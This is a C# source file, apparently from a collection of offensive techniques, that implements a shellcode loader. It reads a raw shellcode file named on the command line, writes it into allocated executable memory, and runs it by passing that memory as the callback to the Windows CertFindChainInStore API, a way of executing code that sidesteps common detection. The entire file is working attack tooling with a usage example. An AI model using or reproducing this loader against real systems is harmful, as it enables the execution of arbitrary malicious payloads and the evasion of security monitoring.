// Wra7h\FlavorTown
// Compile: Visual Studio 2022 & .NET Fx 3.5+

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CertFindChainInStore
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: CertFindChainInStore.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero,
                            (uint)payload.Length,
                            0x1000 /*COMMIT*/,
                            0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(
                Process.GetCurrentProcess().Handle,
                hAlloc,
                payload.Length,
                0x20, //RX
                out oldProtect);

            IntPtr hCertStore = CertOpenSystemStore(0, "MY");

            CERT_CHAIN_FIND_BY_ISSUER_PARA sCCFIP = new CERT_CHAIN_FIND_BY_ISSUER_PARA();
            sCCFIP.pfnFindCallback = hAlloc;
            sCCFIP.cbSize = (uint)Marshal.SizeOf(sCCFIP);

            CertFindChainInStore(
                hCertStore,
                0x1,
                0,
                1,
                ref sCCFIP,
                IntPtr.Zero);

            //Cleanup
            CertCloseStore(hCertStore, 0);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("crypt32.dll", CharSet = CharSet.Unicode)]
        public static extern IntPtr CertOpenSystemStore(
            uint hProv,
            String szSubsystemProtocol
            );

        [DllImport("crypt32.dll", SetLastError = true)]
        public static extern IntPtr CertFindChainInStore(
            IntPtr hCertStore,
            uint dwCertEncodingType,
            uint dwFindFlags,
            uint dwFindType,
            ref CERT_CHAIN_FIND_BY_ISSUER_PARA pvFindPara,
            IntPtr pPrevChainContext);

        [DllImport("crypt32.dll", SetLastError = true)]
        public static extern bool CertCloseStore(IntPtr storeProvider, int flags);

        public struct CERT_CHAIN_FIND_BY_ISSUER_PARA
        {
            public uint cbSize;
            public string pszUsageIdentifier;
            public uint dwKeySpec;
            public uint dwAcquirePrivateKeyFlags;
            public uint cIssuer;
            public IntPtr rgIssuer;
            public IntPtr pfnFindCallback;
            public IntPtr pvFindArg;
            public uint dwIssuerChainIndex;
            public uint dwIssuerElementIndex;
        }
    }
}
